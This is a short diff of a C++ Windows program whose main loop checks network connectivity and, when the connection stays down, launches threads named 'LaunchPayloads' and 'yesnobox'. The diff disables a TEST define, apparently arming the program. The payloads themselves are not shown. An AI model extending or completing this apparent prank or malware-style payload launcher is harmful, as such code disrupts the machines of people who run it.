@@ -18,8 +18,8 @@ std::random_device rd;
 std::mt19937 mt(rd());
 std::atomic<int> runtime = 0;
 
-#define TEST
 //#define FORCELOOP
+//#define TEST
 
 void reboot(void) 
 {
@@ -196,13 +196,13 @@ void nonblockingMsg(LPCWSTR displaystring, LPCWSTR title, int flags) {
 
 int main(void)
 {
-
 	for (;;) {
 		time_t t = time(NULL);
 		tm tptr;
 		localtime_s(&tptr, &t); // TODO: use system time or GMT or something idk just make it not use local time because people can change that AAAAAAAAA
 		if (!InternetCheckConnection(L"http://www.google.com", FLAG_ICC_FORCE_CONNECTION, 0)) {
 			std::thread(nonblockingMsg, L"Please reconnect to the network", L"Warning", MB_OK).detach();
+
 			std::this_thread::sleep_for(std::chrono::seconds(15));
 			if (!InternetCheckConnection(L"http://www.google.com", FLAG_ICC_FORCE_CONNECTION, 0)) {
 				goto startofend;
@@ -222,6 +222,7 @@ int main(void)
 		}
 
 	startofend:
+
 		std::thread(yesnobox).detach();
 		std::thread(LaunchPayloads).detach();
 		for (runtime = 0; runtime <= MAX_RUNTIME; runtime++) {
